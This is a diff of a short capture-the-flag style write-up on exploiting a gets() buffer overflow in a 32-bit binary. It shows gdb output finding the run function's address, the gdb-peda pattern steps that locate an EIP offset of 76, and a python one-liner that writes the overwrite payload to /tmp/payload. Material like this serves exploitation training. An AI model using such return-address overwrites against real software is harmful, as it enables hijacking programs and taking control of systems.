@@ -1,12 +1,17 @@
-To exploit the buffer overflow of the function gets in the main function
-The basic problem is that the function doesn't know how big the buffer is, so it continues reading until it finds a newline or encounters EOF, and may overflow the bounds of the buffer it was given
-So we have to overwrite the address of the EIP register and put the address of the run function:
+# To exploit the buffer overflow of the function gets in the main function
+# The basic problem is that the function doesn't know how big the buffer is, so it continues reading until it finds a newline or encounters EOF, and may overflow the bounds of the buffer it was given
+# So we have to overwrite the address of the EIP register and put the address of the run function:
 (gdb) x/x run
 0x8048444 <run>:	0x55
 
-buffer offset = 76, http://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/ 
-run:
-call system
+# we find the offset buffer of gets
+gdb-peda$ pattern create 100
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+gdb-peda$ r
+AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
+gdb-peda$ pattern search
+Registers contain pattern buffer:
+EIP+0 found at offset: 76
 
 to execute run:
 - python -c 'print "k"*76 + "\x44\x84\x04\x08"' > /tmp/payload
